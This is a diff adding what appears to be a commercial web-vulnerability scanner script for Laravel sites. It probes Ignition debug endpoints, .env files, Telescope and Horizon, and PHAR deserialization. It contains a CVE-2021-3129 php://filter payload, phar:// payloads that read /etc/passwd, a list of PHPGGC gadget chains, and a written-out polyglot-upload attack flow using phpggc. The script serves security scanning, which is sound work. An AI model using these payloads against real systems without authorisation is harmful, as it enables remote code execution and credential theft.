@@ -1,0 +1,516 @@
+#include constants.inc;
+#include helpers.inc;
+
+var targetUrl = new TURL(scanURL.url);
+
+// Laravel Debug Mode / Ignition RCE (CVE-2021-3129)
+// .env exposure, Telescope, Horizon, PHAR deserialization
+
+function testLaravelDebugMode() {
+    var debugPaths = [
+        "/_ignition/health-check",
+        "/_ignition/execute-solution",
+        "/_ignition/share-report",
+        "/_ignition/scripts",
+        "/_ignition/styles",
+    ];
+
+    for (var i = 0; i < debugPaths.length; i++) {
+        var job = new THTTPJob();
+        job.url = targetUrl;
+        job.URI = debugPaths[i];
+        job.execute();
+
+        if (!job.wasError && job.response.msg2 == 200) {
+            var body = job.response.body;
+            if (body.indexOf("ignition") != -1 || body.indexOf("laravel") != -1 ||
+                body.indexOf("Facade") != -1 || body.indexOf("solution") != -1) {
+
+                var ri = new TReportItem();
+                ri.LoadFromFile("Application_Error.xml");
+                ri.affects = debugPaths[i];
+                ri.alertPath = "Scripts/Laravel";
+                ri.name = "Laravel Ignition Debug Mode Exposed";
+                ri.severity = 3;
+                ri.setHttpInfo(job);
+                ri.details = "Laravel Ignition debug endpoint accessible at [bold]" + debugPaths[i] + "[/bold].[break]" +
+                    "This may allow CVE-2021-3129 (Ignition RCE) exploitation via _ignition/execute-solution.[break]" +
+                    "Debug mode leaks application internals, file paths, database credentials, and stack traces.";
+                AddReportItem(ri);
+            }
+        }
+    }
+
+    // force a 404/500 to trigger debug page
+    var job2 = new THTTPJob();
+    job2.url = targetUrl;
+    job2.URI = "/a]b[c_debug_test_" + Math.floor(Math.random() * 99999);
+    job2.execute();
+
+    if (!job2.wasError) {
+        var body2 = job2.response.body;
+        if (body2.indexOf("Whoops") != -1 || body2.indexOf("DebugBar") != -1 ||
+            body2.indexOf("Laravel") != -1 || body2.indexOf("Illuminate\\") != -1 ||
+            body2.indexOf("app_debug") != -1 || body2.indexOf("stack trace") != -1 ||
+            body2.indexOf("vendor/laravel") != -1 || body2.indexOf("artisan") != -1) {
+
+            var ri = new TReportItem();
+            ri.LoadFromFile("Application_Error.xml");
+            ri.affects = "/";
+            ri.alertPath = "Scripts/Laravel";
+            ri.name = "Laravel Debug Mode Enabled (APP_DEBUG=true)";
+            ri.severity = 3;
+            ri.setHttpInfo(job2);
+            ri.details = "Laravel debug mode is enabled. Error pages expose:[break]" +
+                "- Full stack traces with file paths[break]" +
+                "- Database connection details[break]" +
+                "- Environment variables[break]" +
+                "- Application secret key[break]" +
+                "Response contains Laravel/Illuminate debug indicators.";
+            AddReportItem(ri);
+        }
+    }
+}
+
+function testIgnitionRCE() {
+    // CVE-2021-3129 - Ignition <= 2.5.1 RCE via execute-solution
+    var job = new THTTPJob();
+    job.url = targetUrl;
+    job.URI = "/_ignition/execute-solution";
+    job.verb = "POST";
+    job.postData = JSON.stringify({
+        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
+        "parameters": {
+            "variableName": "test",
+            "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
+        }
+    });
+    job.request.addHeader("Content-Type", "application/json");
+    job.execute();
+
+    if (!job.wasError) {
+        var body = job.response.body;
+        if (job.response.msg2 != 404 && job.response.msg2 != 405) {
+            if (body.indexOf("solutions") != -1 || body.indexOf("Facade") != -1 ||
+                body.indexOf("variableName") != -1 ||
+                (job.response.msg2 == 500 && (body.indexOf("Ignition") != -1 || body.indexOf("laravel") != -1 || body.indexOf("execute-solution") != -1))) {
+
+                var ri = new TReportItem();
+                ri.LoadFromFile("Application_Error.xml");
+                ri.affects = "/_ignition/execute-solution";
+                ri.alertPath = "Scripts/Laravel";
+                ri.name = "Laravel Ignition RCE (CVE-2021-3129)";
+                ri.severity = 4;
+                ri.setHttpInfo(job);
+                ri.details = "Ignition execute-solution endpoint accepts POST requests.[break]" +
+                    "CVE-2021-3129 allows RCE through log file manipulation and PHAR deserialization.[break]" +
+                    "The endpoint processes solution class names and parameters, enabling arbitrary file writes " +
+                    "via php://filter chains.[break]" +
+                    "Response status: " + job.response.msg2;
+                AddReportItem(ri);
+            }
+        }
+    }
+}
+
+function testEnvExposure() {
+    var envPaths = [
+        "/.env",
+        "/.env.backup",
+        "/.env.old",
+        "/.env.save",
+        "/.env.bak",
+        "/.env.production",
+        "/.env.staging",
+        "/.env.local",
+        "/.env.dev",
+        "/.env.example",
+        "/.env.dist",
+        "/..env",
+        "/.env.swp",
+        "/.env~",
+        "/public/.env",
+        "/app/.env",
+        "/laravel/.env",
+        "/backend/.env",
+        "/api/.env",
+    ];
+
+    var sensitiveKeys = ["APP_KEY", "DB_PASSWORD", "DB_HOST", "MAIL_PASSWORD",
+        "AWS_SECRET", "REDIS_PASSWORD", "PUSHER_SECRET", "JWT_SECRET",
+        "API_KEY", "SECRET_KEY", "STRIPE_SECRET", "PAYPAL_SECRET",
+        "TWILIO_AUTH", "SENDGRID_API", "S3_SECRET", "GITHUB_SECRET",
+        "GOOGLE_SECRET", "FACEBOOK_SECRET"];
+
+    for (var i = 0; i < envPaths.length; i++) {
+        var job = new THTTPJob();
+        job.url = targetUrl;
+        job.URI = envPaths[i];
+        job.execute();
+
+        if (!job.wasError && job.response.msg2 == 200) {
+            var body = job.response.body;
+            var foundKeys = [];
+
+            for (var k = 0; k < sensitiveKeys.length; k++) {
+                if (body.indexOf(sensitiveKeys[k]) != -1) {
+                    foundKeys.push(sensitiveKeys[k]);
+                }
+            }
+
+            if (foundKeys.length > 0 || (body.indexOf("APP_NAME") != -1 && body.indexOf("APP_ENV") != -1)) {
+                var ri = new TReportItem();
+                ri.LoadFromFile("Application_Error.xml");
+                ri.affects = envPaths[i];
+                ri.alertPath = "Scripts/Laravel";
+                ri.name = "Laravel .env File Exposed - Credentials Leak";
+                ri.severity = 4;
+                ri.setHttpInfo(job);
+                ri.details = "Environment configuration file accessible at [bold]" + envPaths[i] + "[/bold].[break]" +
+                    "Contains application secrets, database credentials, and API keys.[break]" +
+                    (foundKeys.length > 0 ? "Sensitive keys found: " + foundKeys.join(", ") : "Laravel environment file structure detected.");
+                AddReportItem(ri);
+                break;
+            }
+        }
+    }
+}
+
+function testPHARDeserialization() {
+    // PHAR deserialization via various Laravel/PHP gadget chains
+    // Test if PHAR stream wrapper is accessible through file operations
+
+    var pharEndpoints = [
+        { path: "/", param: "file", method: "GET" },
+        { path: "/", param: "path", method: "GET" },
+        { path: "/", param: "img", method: "GET" },
+        { path: "/", param: "image", method: "GET" },
+        { path: "/", param: "src", method: "GET" },
+        { path: "/", param: "document", method: "GET" },
+        { path: "/", param: "page", method: "GET" },
+        { path: "/", param: "template", method: "GET" },
+        { path: "/", param: "url", method: "GET" },
+        { path: "/", param: "resource", method: "GET" },
+        { path: "/api/upload", method: "POST" },
+        { path: "/upload", method: "POST" },
+        { path: "/admin/upload", method: "POST" },
+    ];
+
+    // Known PHPGGC gadget chains for Laravel/Symfony/PHP frameworks
+    var gadgetChains = [
+        { name: "Laravel/RCE1", desc: "PendingBroadcast -> dispatch() via __destruct", framework: "Laravel 5.5-5.8" },
+        { name: "Laravel/RCE2", desc: "PendingCommand via __destruct -> run()", framework: "Laravel 5.4-5.8" },
+        { name: "Laravel/RCE3", desc: "EvalLoader via __destruct", framework: "Laravel 5.5-5.8" },
+        { name: "Laravel/RCE4", desc: "PendingBroadcast -> dispatch() (alt chain)", framework: "Laravel 5.5-8.x" },
+        { name: "Laravel/RCE5", desc: "QueueManager -> connection() via __destruct", framework: "Laravel 5.5-5.8" },
+        { name: "Laravel/RCE6", desc: "PendingBroadcast -> dispatch() via events", framework: "Laravel 5.5-9.x" },
+        { name: "Laravel/RCE7", desc: "Response -> __toString via HttpClient", framework: "Laravel 7.x-8.x" },
+        { name: "Laravel/RCE8", desc: "TagAwareAdapter via commit() __destruct", framework: "Laravel 6.x-9.x" },
+        { name: "Laravel/RCE9", desc: "UriSigner via validate() chain", framework: "Laravel 7.x-9.x" },
+        { name: "Laravel/RCE10", desc: "Process via __destruct -> stop()", framework: "Laravel 7.x-10.x" },
+        { name: "Monolog/RCE1", desc: "BufferHandler -> handle -> StreamHandler write", framework: "Monolog 1.x-2.x" },
+        { name: "Monolog/RCE2", desc: "BufferHandler -> handle -> NativeMailerHandler", framework: "Monolog 1.x" },
+        { name: "Monolog/RCE3", desc: "SyslogUdpHandler via __destruct -> close()", framework: "Monolog 1.x-2.x" },
+        { name: "Guzzle/RCE1", desc: "FileCookieJar -> __destruct -> save()", framework: "Guzzle 6.x-7.x" },
+        { name: "Guzzle/FW1", desc: "FileCookieJar -> save() file write", framework: "Guzzle 4.x-7.x" },
+        { name: "Guzzle/INFO1", desc: "FileCookieJar -> __toString info disclosure", framework: "Guzzle 6.x-7.x" },
+        { name: "Symfony/RCE1", desc: "Process -> __destruct -> stop()", framework: "Symfony 3.x-6.x" },
+        { name: "Symfony/RCE2", desc: "Serializable ObjectProxy", framework: "Symfony 3.x-4.x" },
+        { name: "Symfony/RCE3", desc: "CacheClearCommand via execute", framework: "Symfony 3.x-4.x" },
+        { name: "Symfony/RCE4", desc: "FilesystemAdapter via __destruct", framework: "Symfony 4.x-6.x" },
+        { name: "Symfony/FW1", desc: "FileSessionHandler file write", framework: "Symfony 2.x-5.x" },
+        { name: "Symfony/FW2", desc: "AbstractPhpFileDumper file write", framework: "Symfony 3.x-4.x" },
+        { name: "SwiftMailer/FW1", desc: "FileByteStream file write", framework: "SwiftMailer 5.x-6.x" },
+        { name: "SwiftMailer/FW2", desc: "FileTransport -> send() file write", framework: "SwiftMailer 5.x-6.x" },
+        { name: "Doctrine/RCE1", desc: "Proxy -> __destruct via metadata", framework: "Doctrine ORM 2.x" },
+        { name: "Doctrine/RCE2", desc: "EntityManager -> close -> metadata RCE", framework: "Doctrine ORM 2.x" },
+        { name: "PHPUnit/RCE1", desc: "EvalLoader -> eval() via __destruct", framework: "PHPUnit 4.x-8.x" },
+        { name: "Slim/RCE1", desc: "Response -> __toString -> StreamInterface", framework: "Slim 3.x-4.x" },
+        { name: "Yii/RCE1", desc: "BatchQueryResult -> __destruct -> close()", framework: "Yii2" },
+        { name: "CakePHP/RCE1", desc: "Marshaller -> __destruct via query", framework: "CakePHP 4.x" },
+        { name: "WordPress/RCE1", desc: "PHPMailer -> __destruct RCE", framework: "WordPress 4.x-5.x" },
+        { name: "Magento/FW1", desc: "Cache adapter file write", framework: "Magento 2.x" },
+        { name: "ThinkPHP/RCE1", desc: "Model -> __destruct -> save()", framework: "ThinkPHP 5.x-6.x" },
+        { name: "ZendFramework/RCE1", desc: "ModuleManager -> __destruct via events", framework: "Zend 2.x-3.x" },
+        { name: "Phalcon/RCE1", desc: "Events Manager -> __destruct -> fire()", framework: "Phalcon 3.x-4.x" },
+    ];
+
+    // Test PHAR:// stream wrapper accessibility
+    for (var i = 0; i < pharEndpoints.length; i++) {
+        var ep = pharEndpoints[i];
+        var pharPayloads = [
+            "phar:///tmp/test.phar/test",
+            "phar://./test.phar/test",
+            "PHAR:///etc/passwd",
+            "phar%3A%2F%2F/tmp/test",
+            "php://filter/resource=phar:///tmp/test",
+        ];
+
+        for (var p = 0; p < pharPayloads.length; p++) {
+            var job = new THTTPJob();
+            job.url = targetUrl;
+
+            if (ep.method == "GET" && ep.param) {
+                job.URI = ep.path + "?" + ep.param + "=" + encodeURIComponent(pharPayloads[p]);
+            } else {
+                job.URI = ep.path;
+                job.verb = "POST";
+                if (ep.param) {
+                    job.postData = ep.param + "=" + encodeURIComponent(pharPayloads[p]);
+                    job.request.addHeader("Content-Type", "application/x-www-form-urlencoded");
+                } else {
+                    job.postData = JSON.stringify({ file: pharPayloads[p], path: pharPayloads[p] });
+                    job.request.addHeader("Content-Type", "application/json");
+                }
+            }
+            job.execute();
+
+            if (!job.wasError) {
+                var body = job.response.body;
+                // Look for PHAR-specific error messages that confirm stream wrapper processing
+                if (body.indexOf("phar error") != -1 ||
+                    body.indexOf("PharData") != -1 ||
+                    body.indexOf("phar://") != -1 ||
+                    body.indexOf("RecursiveDirectoryIterator") != -1 ||
+                    body.indexOf("is not a valid phar") != -1 ||
+                    body.indexOf("cannot open phar") != -1 ||
+                    body.indexOf("phar extension") != -1 ||
+                    body.indexOf("__wakeup") != -1 ||
+                    body.indexOf("unserialize") != -1) {
+
+                    var chainList = [];
+                    for (var g = 0; g < gadgetChains.length; g++) {
+                        chainList.push(gadgetChains[g].name + " (" + gadgetChains[g].framework + ")");
+                    }
+
+                    var ri = new TReportItem();
+                    ri.LoadFromFile("Application_Error.xml");
+                    ri.affects = ep.path;
+                    ri.alertPath = "Scripts/Laravel";
+                    ri.parameter = ep.param || "body";
+                    ri.name = "PHAR Deserialization - Stream Wrapper Active";
+                    ri.severity = 4;
+                    ri.setHttpInfo(job);
+                    ri.details = "PHAR stream wrapper is processed via parameter [bold]" + (ep.param || "body") + "[/bold].[break]" +
+                        "Payload: " + pharPayloads[p] + "[break]" +
+                        "The server processes phar:// URIs, enabling PHP object deserialization attacks.[break][break]" +
+                        "Applicable PHPGGC gadget chains for exploitation:[break]" +
+                        chainList.join("[break]") + "[break][break]" +
+                        "Generate payloads: phpggc <chain> <command> --phar phar -o exploit.phar";
+                    AddReportItem(ri);
+                    return;
+                }
+            }
+        }
+    }
+}
+
+function testPHARUpload() {
+    // Test if polyglot PHAR/JPEG can be uploaded
+    // PHAR files can be crafted as valid images that trigger deserialization
+    var uploadPaths = [
+        "/upload", "/api/upload", "/admin/upload",
+        "/api/v1/upload", "/media/upload", "/files/upload",
+        "/api/files", "/api/images", "/avatar/upload",
+        "/profile/avatar", "/api/v1/files",
+    ];
+
+    for (var i = 0; i < uploadPaths.length; i++) {
+        var job = new THTTPJob();
+        job.url = targetUrl;
+        job.URI = uploadPaths[i];
+        job.execute();
+
+        if (!job.wasError && (job.response.msg2 == 200 || job.response.msg2 == 405 || job.response.msg2 == 302)) {
+            var body = job.response.body;
+            if (body.indexOf("upload") != -1 || body.indexOf("multipart") != -1 ||
+                (body.indexOf("file") != -1 && (body.indexOf("form") != -1 || body.indexOf("input") != -1 || body.indexOf("submit") != -1)) ||
+                (job.response.msg2 == 405 && body.indexOf("Method") != -1)) {
+
+                var ri = new TReportItem();
+                ri.LoadFromFile("Application_Error.xml");
+                ri.affects = uploadPaths[i];
+                ri.alertPath = "Scripts/Laravel";
+                ri.name = "File Upload Endpoint Found - PHAR Polyglot Vector";
+                ri.severity = 1;
+                ri.setHttpInfo(job);
+                ri.details = "Upload endpoint discovered at [bold]" + uploadPaths[i] + "[/bold].[break]" +
+                    "If the application uses file functions (file_exists, is_dir, getimagesize, etc.) on uploaded files, " +
+                    "a PHAR polyglot (JPEG/PHAR hybrid) can trigger deserialization.[break][break]" +
+                    "Attack flow:[break]" +
+                    "1. Generate PHAR payload: phpggc Laravel/RCE6 system 'id' --phar phar -o exploit.phar[break]" +
+                    "2. Convert to JPEG polyglot: php -r '$p=new Phar(\"exploit.phar\");$p->convertToData(Phar::TAR);' then prepend JPEG header[break]" +
+                    "3. Upload as .jpg[break]" +
+                    "4. Trigger via: phar:///path/to/uploaded/file.jpg/test[break][break]" +
+                    "Vulnerable PHP functions that trigger PHAR deserialization:[break]" +
+                    "file_exists, file_get_contents, file_put_contents, fopen, is_dir, is_file, is_link, " +
+                    "is_writable, is_readable, filesize, filetype, file, stat, lstat, " +
+                    "getimagesize, exif_read_data, hash_file, md5_file, sha1_file, " +
+                    "copy, rename, unlink, readfile, include, include_once, require, require_once";
+                AddReportItem(ri);
+            }
+        }
+    }
+}
+
+function testLaravelTelescope() {
+    var telescopePaths = [
+        "/telescope",
+        "/telescope/requests",
+        "/telescope/commands",
+        "/telescope/schedule",
+        "/telescope/jobs",
+        "/telescope/exceptions",
+        "/telescope/logs",
+        "/telescope/dumps",
+        "/telescope/queries",
+        "/telescope/models",
+        "/telescope/events",
+        "/telescope/mail",
+        "/telescope/notifications",
+        "/telescope/cache",
+        "/telescope/redis",
+        "/telescope/gates",
+        "/telescope/views",
+    ];
+
+    var foundPaths = [];
+
+    for (var i = 0; i < telescopePaths.length; i++) {
+        var job = new THTTPJob();
+        job.url = targetUrl;
+        job.URI = telescopePaths[i];
+        job.execute();
+
+        if (!job.wasError && job.response.msg2 == 200) {
+            var body = job.response.body;
+            if (body.indexOf("telescope") != -1 || body.indexOf("Laravel") != -1 ||
+                body.indexOf("entries") != -1) {
+                foundPaths.push(telescopePaths[i]);
+            }
+        }
+    }
+
+    if (foundPaths.length > 0) {
+        var ri = new TReportItem();
+        ri.LoadFromFile("Application_Error.xml");
+        ri.affects = foundPaths[0];
+        ri.alertPath = "Scripts/Laravel";
+        ri.name = "Laravel Telescope Debug Dashboard Exposed";
+        ri.severity = 3;
+        ri.setHttpInfo(job);
+        ri.details = "Laravel Telescope is accessible without authentication.[break]" +
+            "Exposed endpoints:[break]" + foundPaths.join("[break]") + "[break][break]" +
+            "Telescope exposes: HTTP requests with headers/payloads, database queries, " +
+            "scheduled jobs, exceptions with stack traces, log entries, mail content, " +
+            "cache operations, and Redis commands.";
+        AddReportItem(ri);
+    }
+}
+
+function testLaravelHorizon() {
+    var job = new THTTPJob();
+    job.url = targetUrl;
+    job.URI = "/horizon";
+    job.execute();
+
+    if (!job.wasError && (job.response.msg2 == 200 || job.response.msg2 == 302)) {
+        var body = job.response.body;
+        if (body.indexOf("horizon") != -1 || body.indexOf("Laravel") != -1 ||
+            body.indexOf("dashboard") != -1 || body.indexOf("queue") != -1) {
+
+            var ri = new TReportItem();
+            ri.LoadFromFile("Application_Error.xml");
+            ri.affects = "/horizon";
+            ri.alertPath = "Scripts/Laravel";
+            ri.name = "Laravel Horizon Dashboard Exposed";
+            ri.severity = 2;
+            ri.setHttpInfo(job);
+            ri.details = "Laravel Horizon queue dashboard is accessible.[break]" +
+                "Exposes job processing details, failed jobs, Redis connection info, and queue configuration.";
+            AddReportItem(ri);
+        }
+    }
+}
+
+function testLaravelRoutes() {
+    // known Laravel default/debug routes
+    var routePaths = [
+        { path: "/api/user", desc: "default API auth route" },
+        { path: "/storage/logs/laravel.log", desc: "application log file" },
+        { path: "/storage/framework/sessions", desc: "session storage directory" },
+        { path: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", desc: "PHPUnit RCE (CVE-2017-9841)" },
+        { path: "/config/app.php", desc: "application configuration" },
+        { path: "/config/database.php", desc: "database configuration" },
+        { path: "/.git/config", desc: "git repository config" },
+        { path: "/.git/HEAD", desc: "git HEAD reference" },
+        { path: "/composer.json", desc: "PHP dependencies manifest" },
+        { path: "/composer.lock", desc: "locked dependency versions" },
+        { path: "/artisan", desc: "Laravel CLI tool" },
+        { path: "/server.php", desc: "Laravel dev server script" },
+        { path: "/storage/", desc: "storage directory listing" },
+        { path: "/public/storage/", desc: "public storage link" },
+        { path: "/debugbar/open", desc: "Laravel Debugbar" },
+        { path: "/__clockwork", desc: "Clockwork debug tool" },
+        { path: "/clockwork/app", desc: "Clockwork debug UI" },
+        { path: "/nova", desc: "Laravel Nova admin" },
+        { path: "/nova/login", desc: "Laravel Nova login" },
+        { path: "/admin", desc: "admin panel" },
+        { path: "/log-viewer", desc: "Log Viewer package" },
+        { path: "/logs", desc: "log viewer" },
+    ];
+
+    var sensitiveFinds = [];
+
+    for (var i = 0; i < routePaths.length; i++) {
+        var job = new THTTPJob();
+        job.url = targetUrl;
+        job.URI = routePaths[i].path;
+        job.execute();
+
+        if (!job.wasError && job.response.msg2 == 200) {
+            var body = job.response.body;
+            var isSensitive = false;
+
+            if (routePaths[i].path.indexOf(".log") != -1 && body.indexOf("stacktrace") != -1) isSensitive = true;
+            if (routePaths[i].path.indexOf(".log") != -1 && body.indexOf("[20") != -1) isSensitive = true;
+            if (routePaths[i].path.indexOf("eval-stdin") != -1) isSensitive = true;
+            if (routePaths[i].path.indexOf(".git") != -1 && body.indexOf("[core]") != -1) isSensitive = true;
+            if (routePaths[i].path.indexOf(".git") != -1 && body.indexOf("ref:") != -1) isSensitive = true;
+            if (routePaths[i].path.indexOf("composer") != -1 && body.indexOf("laravel") != -1) isSensitive = true;
+            if (routePaths[i].path.indexOf("config") != -1 && body.indexOf("<?php") != -1) isSensitive = true;
+            if (routePaths[i].path.indexOf("debugbar") != -1) isSensitive = true;
+            if (routePaths[i].path.indexOf("clockwork") != -1 && body.indexOf("clockwork") != -1) isSensitive = true;
+
+            if (isSensitive) {
+                sensitiveFinds.push(routePaths[i].path + " (" + routePaths[i].desc + ")");
+
+                var severity = 2;
+                if (routePaths[i].path.indexOf("eval-stdin") != -1) severity = 4;
+                if (routePaths[i].path.indexOf(".git") != -1) severity = 3;
+                if (routePaths[i].path.indexOf(".log") != -1) severity = 3;
+                if (routePaths[i].path.indexOf("config") != -1) severity = 4;
+
+                var ri = new TReportItem();
+                ri.LoadFromFile("Application_Error.xml");
+                ri.affects = routePaths[i].path;
+                ri.alertPath = "Scripts/Laravel";
+                ri.name = "Laravel Sensitive Path Exposed: " + routePaths[i].desc;
+                ri.severity = severity;
+                ri.setHttpInfo(job);
+                ri.details = "Sensitive Laravel path accessible: [bold]" + routePaths[i].path + "[/bold][break]" +
+                    "Description: " + routePaths[i].desc;
+                AddReportItem(ri);
+            }
+        }
+    }
+}
+
+testLaravelDebugMode();
+testIgnitionRCE();
+testEnvExposure();
+testPHARDeserialization();
+testPHARUpload();
+testLaravelTelescope();
+testLaravelHorizon();
+testLaravelRoutes();
